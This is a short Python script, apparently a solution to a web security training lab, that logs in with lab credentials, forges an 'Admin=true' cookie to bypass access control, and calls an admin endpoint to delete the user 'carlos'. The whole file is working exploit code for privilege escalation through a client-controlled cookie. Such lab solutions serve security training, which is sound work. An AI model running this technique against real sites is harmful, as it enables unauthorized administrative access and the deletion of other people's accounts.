import requests
import re
import sys

def get_csrf_token(response_text):
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text)
    if csrf_token_match:
        return csrf_token_match.group(1)
    return None

def main(base_url, delete_url):
    session = requests.Session()
    response = session.get(base_url + '/my-account')
    csrf_token = get_csrf_token(response.text)

    if not csrf_token:
        print("CSRF token not found")
        sys.exit(1)

    login_data = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }

    response = session.post(base_url + '/login', data=login_data)

    if response.status_code != 200:
        print("Login failed")
        sys.exit(1)

    session.cookies.set("Admin", "true")

    response = session.get(delete_url)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    base_url = sys.argv[1]
    delete_url = base_url + '/admin/delete?username=carlos'

    main(base_url, delete_url)
